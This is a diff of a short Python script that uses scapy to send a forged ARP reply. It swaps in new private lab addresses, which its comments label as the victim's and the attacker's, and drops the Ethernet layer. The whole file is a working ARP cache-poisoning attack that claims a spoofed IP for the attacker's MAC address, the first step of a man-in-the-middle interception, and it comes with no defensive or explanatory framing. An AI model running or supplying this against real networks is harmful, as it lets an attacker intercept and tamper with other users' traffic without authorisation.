@@ -1,19 +1,19 @@
-from scapy.all import ARP, Ether, send
+from scapy.all import ARP, send
 
-target_ip = "192.168.1.10"       
-target_mac = "00:11:22:33:44:55" 
-spoof_ip = "192.168.1.1"         
-my_mac = "de:ad:be:ef:00:01"     
+target_ip = "172.30.0.4"         # victim IP  
+target_mac = "de:5c:e3:e5:6c:eb" # victim MAC
+spoof_ip = "172.30.0.2"          # IP address to spoof
+my_mac = "de:ad:be:ef:00:05"     # Attacker's MAC address
 
-eth = Ether(dst=target_mac)
 
-arp = ARP(op=2,                # 2 = is-at (ARP reply)
-          psrc=spoof_ip,       # Claimed source IP
-          hwsrc=my_mac,        # Claimed source MAC (attacker's)
-          pdst=target_ip,      # Target IP (victim)
-          hwdst=target_mac)    # Target MAC (victim)
+packet = ARP(op=2,                # 2 = is-at (ARP reply)
+          psrc=spoof_ip,       # Claimed source IP (attacker's or another IP you want to spoof)
+          hwsrc=my_mac,        # Claimed source MAC (attacker's or a fake MAC you want to use)
+          pdst=target_ip,      # Target IP (victim IP)
+          hwdst=target_mac     # Target MAC (victim MAC, since it should be unicast)
+    )
 
-packet = eth / arp
+#print(packet.show())
 send(packet, verbose=False)
 
 print("ARP reply sent.")
